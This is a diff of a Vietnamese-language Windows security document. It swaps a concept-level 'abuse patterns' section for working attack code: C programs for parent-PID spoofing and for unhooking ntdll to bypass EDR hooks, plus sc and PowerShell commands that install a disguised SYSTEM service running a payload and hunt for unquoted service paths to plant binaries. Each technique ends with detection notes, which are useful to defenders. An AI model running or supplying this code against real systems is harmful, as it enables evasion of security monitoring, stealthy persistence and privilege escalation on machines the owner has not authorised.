@@ -802,72 +802,212 @@ Architecture attack surface không có nghĩa là exploit instructions. Nó có 
 
 ---
 
-## 8. Abuse Patterns — Concept Level
+## 8. Abuse Techniques — Code Examples
 
-Mục này không phải exploit guide. Đây là phân tích risk level của từng architectural pattern — cách thiết kế của Windows tạo ra opportunities mà attacker khai thác và defender cần understand.
+### 8.1 PPID Spoofing (Process Tree Deception)
 
-### 8.1 Process Tree Deception
+**Concept**: Parent PID có thể bị giả mạo khi tạo process bằng `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS`. Process con sẽ hiện như con của một process hợp lệ (ví dụ: `explorer.exe`) thay vì process thật đã tạo ra nó.
 
-**Pattern**: Giả mạo process identity bằng cách dùng tên process hợp lệ hoặc manipulate process creation.
+**Tại sao hiệu quả**: Tool phân tích chỉ nhìn PPID → bị đánh lừa. Process tree-based detection bỏ lỡ anomaly chain.
 
-**Tại sao dễ bị lừa**: Process name (`EPROCESS.ImageFileName`) chỉ 15 ký tự. Name đơn giản dễ trùng. Parent PID có thể được set khi tạo process (via `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS`).
+```c
+#include <windows.h>
+#include <tlhelp32.h>
+#include <stdio.h>
 
-**Cái gì thực sự định danh một process**:
-- Full image path (không phải chỉ tên)
-- Digital signature (valid, trusted issuer)
-- Parent PID + parent path
-- Session ID
-- Token (user, integrity level)
-- Command line arguments
-- Load time
+// Tạo process với PPID giả mạo — process trông như con của explorer.exe
+BOOL SpawnWithFakePPID(DWORD fakePPID, const wchar_t* cmdline) {
+    // Mở handle đến target parent (fake parent) — chỉ cần PROCESS_CREATE_PROCESS
+    HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, fakePPID);
+    if (!hParent) {
+        printf("[-] OpenProcess failed: %lu\n", GetLastError());
+        return FALSE;
+    }
 
-**Ví dụ pattern bất thường**:
+    // Tạo attribute list với PPID attribute
+    SIZE_T attrSize = 0;
+    InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
+    LPPROC_THREAD_ATTRIBUTE_LIST attrList =
+        (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSize);
+    InitializeProcThreadAttributeList(attrList, 1, 0, &attrSize);
+
+    UpdateProcThreadAttribute(attrList, 0,
+        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
+        &hParent, sizeof(HANDLE), NULL, NULL);
+
+    STARTUPINFOEXW siEx = { 0 };
+    siEx.StartupInfo.cb = sizeof(siEx);
+    siEx.lpAttributeList = attrList;
+
+    PROCESS_INFORMATION pi;
+    wchar_t cmd[MAX_PATH];
+    wcscpy_s(cmd, MAX_PATH, cmdline);
+
+    BOOL result = CreateProcessW(NULL, cmd, NULL, NULL, FALSE,
+        EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE,
+        NULL, NULL, (LPSTARTUPINFOW)&siEx, &pi);
+
+    if (result)
+        printf("[+] Spawned PID %lu with fake PPID %lu\n", pi.dwProcessId, fakePPID);
+
+    DeleteProcThreadAttributeList(attrList);
+    HeapFree(GetProcessHeap(), 0, attrList);
+    CloseHandle(hParent);
+    if (result) { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
+    return result;
+}
+
+// Tìm PID của explorer.exe
+DWORD FindExplorerPID() {
+    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    PROCESSENTRY32W pe = { sizeof(pe) };
+    DWORD pid = 0;
+    if (Process32FirstW(snap, &pe)) {
+        do {
+            if (!_wcsicmp(pe.szExeFile, L"explorer.exe")) {
+                pid = pe.th32ProcessID; break;
+            }
+        } while (Process32NextW(snap, &pe));
+    }
+    CloseHandle(snap);
+    return pid;
+}
+
+// Usage:
+// DWORD explorerPID = FindExplorerPID();
+// SpawnWithFakePPID(explorerPID, L"cmd.exe");
+// → cmd.exe hiện trong Process Explorer như con của explorer.exe
+// Compile: cl /nologo ppid_spoof.c /link /out:spoof.exe
+```
+
+**Detection:**
+- `PsSetCreateProcessNotifyRoutineEx`: Kernel nhận `CreatingThreadId.UniqueProcess` = PID thật của caller — khác với PPID được spoof. EDR có thể so sánh hai giá trị này.
+- Sysmon Event 1: `ParentProcessId` = explorer.exe (giả) nhưng `ParentImage` path và `ParentCommandLine` của creator thật có thể diverge nếu EDR enrich từ kernel callback.
+- Cái gì thực sự định danh process: full image path, digital signature, session ID, token integrity level, load time — không chỉ PPID.
+
+**Ví dụ anomaly cần detect:**
 - `svchost.exe` không phải con của `services.exe`
-- `lsass.exe` spawning child processes (hiếm khi hợp lệ)
+- `lsass.exe` spawning child processes
 - `explorer.exe` chạy với SYSTEM token
-- `notepad.exe` với command line chứa encoded payload
-- Process có tên là system process nhưng path không phải `%SystemRoot%\System32\`
+- Process tên system nhưng path không phải `%SystemRoot%\System32\`
 
-**Defender implication**: Process tree monitoring phải bao gồm path, signature, và parent verification — không chỉ tên.
+### 8.2 ntdll Unhooking — Remove EDR Inline Hooks
 
-### 8.2 User-Mode Visibility Gaps
+**Concept**: EDR inject inline hooks vào ntdll.dll trong memory (patch 5 bytes đầu của mỗi NtXxx stub thành JMP sang hook handler). Ta restore lại bytes gốc từ bản ntdll sạch trên disk → EDR hook bị bypass.
 
-**Pattern**: Thực hiện behavior ở layer mà sensor user-mode không quan sát được.
+```c
+#include <windows.h>
+#include <stdio.h>
 
-**Sensor layer và visibility gap tương ứng:**
+// Đọc ntdll sạch từ disk và restore .text section vào ntdll trong memory
+BOOL UnhookNtdll() {
+    // 1. Map ntdll sạch từ disk (không qua loader — không trigger hook)
+    HANDLE hFile = CreateFileW(L"C:\\Windows\\System32\\ntdll.dll",
+        GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
 
-| Sensor ở lớp | Visibility gap / sensor boundary | Research term thường gặp |
+    HANDLE hMapping = CreateFileMappingW(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
+    LPVOID pCleanNtdll = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
+
+    // 2. Lấy địa chỉ ntdll đang được load trong memory (có hooks)
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+
+    // 3. Parse PE để tìm .text section
+    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)pCleanNtdll;
+    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PBYTE)pCleanNtdll + dos->e_lfanew);
+    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
+
+    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
+        if (memcmp(section[i].Name, ".text", 5) == 0) {
+            PVOID hookedSection = (PBYTE)hNtdll + section[i].VirtualAddress;
+            PVOID cleanSection  = (PBYTE)pCleanNtdll + section[i].VirtualAddress;
+            SIZE_T sectionSize  = section[i].Misc.VirtualSize;
+
+            // 4. Change protection, copy clean bytes, restore protection
+            DWORD oldProtect;
+            VirtualProtect(hookedSection, sectionSize, PAGE_EXECUTE_WRITECOPY, &oldProtect);
+            memcpy(hookedSection, cleanSection, sectionSize);
+            VirtualProtect(hookedSection, sectionSize, oldProtect, &oldProtect);
+
+            printf("[+] ntdll .text section restored (%zu bytes)\n", sectionSize);
+            break;
+        }
+        section++;
+    }
+
+    UnmapViewOfFile(pCleanNtdll);
+    CloseHandle(hMapping);
+    CloseHandle(hFile);
+    return TRUE;
+}
+// Compile: cl /nologo unhook.c /link /out:unhook.exe
+```
+
+**Sensor layer và visibility gap:**
+
+| Sensor ở lớp | Visibility gap sau unhook | Không bị ảnh hưởng |
 |---|---|---|
-| Win32 API hook (kernel32/kernelbase) | Gọi native API ở layer thấp hơn Win32; Win32-only sensor không thấy đầy đủ | Direct Native API call |
-| ntdll inline hook (stub level) | Syscall-level observation gap nếu chỉ dựa vào ntdll inline hook | Direct syscall research class |
-| ntdll inline hook (stub tampered) | In-memory hook coverage limitation khi module view bị thay đổi | ntdll remapping/tamper research class |
-| ntdll hook (anti-tamper by EDR) | Indirect syscall-style visibility gap; cần kernel/provider correlation | Indirect syscall research class |
-| User-mode API call monitoring only | Kernel-mode operation nằm ngoài user-mode sensor layer | Kernel-mode operation |
-| AMSI scan tại script host | AMSI memory-tamper visibility gap; cần integrity/behavior correlation | AMSI tamper research class |
+| Win32 API hook (kernel32) | Vẫn bị hook (ta chỉ unhook ntdll) | — |
+| ntdll inline hook | **Bị bypass** — bytes đã restore | Kernel callbacks |
+| Kernel callbacks (Ps/Ob/Cm) | Vẫn fire — không phụ thuộc ntdll | Tất cả |
+| ETW-TI | Vẫn capture — kernel-level | Tất cả |
+| Minifilter file I/O | Vẫn intercept | Tất cả |
 
-**Counter-observation — kernel layer không bị visibility gap bởi user-mode technique:**
-- `PsSetCreateProcessNotifyRoutineEx` fires bất kể process được tạo bằng Win32, Native API, hay direct syscall.
-- `ObRegisterCallbacks` fires cho mọi handle open — kể cả từ direct syscall.
-- Minifilter intercepts mọi I/O qua I/O Manager — kể cả từ `NtCreateFile` trực tiếp.
-- Kernel callbacks chỉ có thể bị tắt bởi code đang chạy ở kernel mode.
+**Detection:**
+- EDR có thể so sánh ntdll .text hash trong memory vs on-disk — mismatch sau khi unhook = alert
+- Sysmon: không có built-in detection, nhưng một số EDR dùng instrumentation callback (`NtSetInformationProcess ProcessInstrumentationCallback`) để detect ntdll tamper
+- Kernel: `PsSetLoadImageNotifyRoutine` không trigger (ntdll đã loaded rồi), nhưng EDR có thể periodically re-scan ntdll integrity
 
-**ETW-TI** (`Microsoft-Windows-Threat-Intelligence`): Provider kernel-level cho high-value events (memory alloc/exec, process memory read, handle access). Chỉ PPL process mới có thể subscribe. Attacker không thể disable từ user mode. Attacker với kernel access có thể tamper ETW provider table, nhưng đây là advanced và noisy operation.
+### 8.3 Service Persistence — SYSTEM Execution
 
-**Implication**: Sensor placement quyết định blind spot. Sensor chỉ ở user mode = bị visibility gap bởi direct syscall. Sensor ở kernel callbacks = không bị visibility gap từ user mode nhưng bị visibility gap bởi kernel exploit. Sensor ở hypervisor (VBS) = không bị visibility gap bởi cả kernel exploit trong VTL 0.
+**Concept**: Tạo service chạy với SYSTEM account → persistent execution qua reboot, không cần user login.
 
-### 8.3 Service Abuse Class
+```cmd
+REM Tạo service mới trỏ đến payload (cần admin)
+sc create "WindowsHealthService" binPath= "C:\Windows\Temp\payload.exe" start= auto obj= LocalSystem
 
-**Pattern**: Abuse service infrastructure để gain persistent privileged execution.
+REM Start ngay
+sc start "WindowsHealthService"
 
-**Tại sao services là high-value target**:
-- Chạy liên tục, kể cả khi không có user logged in
-- Thường với elevated accounts (SYSTEM, NetworkService)
-- Auto-start theo system boot
-- Configuration lưu trong registry — audit trail nhưng cũng persistent mechanism
+REM Verify
+sc query "WindowsHealthService"
+sc qc "WindowsHealthService"
+```
 
-**Weak service permissions**: Nếu service binary path writable, service DLL path writable, hoặc service registry key writable bởi low-privilege user → privilege escalation opportunity.
+**Hoặc dùng PowerShell:**
+```powershell
+# Tạo service với New-Service
+New-Service -Name "WinDefUpdate" `
+    -BinaryPathName "C:\ProgramData\payload.exe" `
+    -StartupType Automatic `
+    -DisplayName "Windows Defender Update Service"
 
-**Service configuration visibility**: Registry path `HKLM\SYSTEM\CurrentControlSet\Services\` là audit trail đầy đủ cho mọi service. Event 7045 (new service install) là detection opportunity. Forensic artifact survive reboot.
+# Service chạy với SYSTEM nếu không specify -Credential
+Start-Service "WinDefUpdate"
+
+# Xóa sau khi test
+Stop-Service "WinDefUpdate"
+Remove-Service "WinDefUpdate"  # PowerShell 6+, hoặc dùng sc delete
+```
+
+**Abuse unquoted service path (nếu service đã tồn tại với path có spaces):**
+```powershell
+# Tìm services có unquoted path với spaces
+Get-WmiObject Win32_Service |
+    Where-Object { $_.PathName -notlike '"*' -and $_.PathName -like '* *' } |
+    Select-Object Name, PathName, StartMode, StartName
+
+# Nếu "C:\Program Files\Vendor\service.exe" → Windows thử:
+# C:\Program.exe
+# C:\Program Files\Vendor.exe  ← nếu writable → plant payload tại đây
+# C:\Program Files\Vendor\service.exe
+```
+
+**Detection:**
+- Security Event 7045 (System.evtx): New service installed — name, binary path, account
+- Sysmon Event 13 (RegistryValueSet): write đến `HKLM\SYSTEM\CurrentControlSet\Services\`
+- `CmRegisterCallback`: EDR thấy service key creation
+- Integrity check: binary path không có valid digital signature
 
 ### 8.4 Driver Attack Surface Class
 
